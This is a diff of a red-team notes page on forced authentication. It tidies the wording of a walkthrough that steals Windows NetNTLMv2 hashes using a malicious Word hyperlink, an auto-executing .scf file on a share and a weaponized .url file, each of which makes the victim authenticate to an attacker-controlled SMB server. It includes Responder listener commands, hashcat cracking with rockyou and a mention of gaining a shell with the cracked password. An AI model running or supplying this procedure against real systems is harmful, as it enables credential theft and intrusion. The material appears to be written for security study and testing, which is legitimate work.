@@ -6,13 +6,13 @@ description: 'Credential Access, Stealing hashes'
 
 ## Execution via Hyperlink to an SMB server
 
-Attacker creates a fake MS Word document that has a hyperlink to attackers server where a `responder` is listening on port 445 and will be capturing the victim's `NetNTLMv2` hash if they click the dodgy link in the below document:
+Let's create a Word document that has a hyperlink to our attacking server where  `responder` will be listening on port 445:
 
 ![](../.gitbook/assets/forced-auth-word.png)
 
 {% file src="../.gitbook/assets/totes-not-a-scam.docx" caption="Forced SMBv2 Authentication - MS Word File" %}
 
-Attacker starts a responder so he can receive incoming SMB authentication request in order to capture the victim's hashes:
+Let's start `Responder` on our kali box:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
@@ -22,11 +22,11 @@ responder -I eth1
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Attacker sends the malicious document to the unsuspectim victim and convinces them to click the link. Once they click the link in the document, `responder` on the attacker's system captures victim's hash:
+Once the link in the document is clicked, the target system sends an authentication request to the attacking host. Since responder is listening on the other end, victim's `NetNTLMv2` hash is captured:
 
 ![](../.gitbook/assets/forced-auth-hashes.png)
 
-Once attacker got the hash, he can try and crack it using hashcat:
+The retrieved hash can then be cracked offline with hashcat:
 
 ```csharp
 hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
@@ -42,7 +42,7 @@ Using the cracked passsword to get a shell on the victim system:
 
 ## Execution via .SCF
 
-Place the below `fa.scf` file on an attacker controlled machine at `10.0.0.7` in a shared folder `tools`
+Place the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools`
 
 {% code-tabs %}
 {% code-tabs-item title="\\\\10.0.0.7\\tools\\fa.scf" %}
@@ -58,17 +58,19 @@ Command=ToggleDesktop
 
 {% file src="../.gitbook/assets/fa.scf" caption="fa.scf" %}
 
-An victim user `low` then opens the share `\\10.0.0.7\tools`, `fa.scf` gets executed and the user's hashes are sent to the attackers machine:
+A victim user `low` opens the share `\\10.0.0.7\tools` and the `fa.scf` gets executed automatically, which in turn forces the victim system to attempt to authenticate to the attacking system at 10.0.0.5 where responder is listening:
 
 ![victim opens \\10.0.0.7\tools, fa.scf executes and gives away low&apos;s hashes](../.gitbook/assets/forced-auth-shares.png)
 
 ![user&apos;s low hashes were received by the attacker](../.gitbook/assets/forced-auth-scf.png)
 
-What's interesting with the `.scf` attack is that the file could easily be downloaded with a browser and as soon as the victim opens the Downloads folder, the hashes are stolen:
+What's interesting with the `.scf` attack is that the file could easily be downloaded through the browser and as soon as the user navigates to the `Downloads` folder, users's hash is stolen:
 
 ![](../.gitbook/assets/forced-auth-downloads.png)
 
 ## Execution via .URL
+
+Create a weaponized .url file and upload it to the victim system:
 
 {% code-tabs %}
 {% code-tabs-item title="c:\\link.url@victim" %}
@@ -82,6 +84,8 @@ IconIndex=1
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+Create a listener on the attacking system:
+
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
 ```text
@@ -90,13 +94,11 @@ responder -I eth1 -v
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Once user navigates to the C:\ where `link.url` file is placed, the file will try to authenticate to our malicious SMB listener on `10.0.0.5` \(attacker machine\) that will capture user's NTLM hashes:
+Once the victim navigates to the C:\ where `link.url` file is placed, the OS tries to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:
 
 ![](../.gitbook/assets/forced-authentication-url.gif)
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1187" %}
-
-[http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)
+{% embed url="http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf" %}
 
 {% embed url="https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/" %}
 
